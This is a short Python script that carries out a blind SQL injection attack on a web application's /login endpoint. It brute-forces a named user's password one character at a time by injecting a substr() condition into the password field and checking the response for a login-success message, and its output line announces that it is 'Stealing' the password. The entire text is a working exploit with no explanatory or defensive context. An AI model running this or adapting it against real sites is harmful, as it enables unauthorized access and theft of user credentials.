import requests
import sys
import string

base = sys.argv[1]
user = sys.argv[2]

print "Stealing %s password:" % user

i = 0
while True:
    i += 1
    for char in string.ascii_letters + string.digits:
        resp = requests.post(base + "/login",
                             data={"username": user,
                                   "password": "' OR (substr(password, %s, 1) = '%s' AND username='%s') --" % (i, char, user)})
        if "You have been logged in" in resp.content:
            sys.stdout.write(char)
            break
    else:
        sys.exit(0)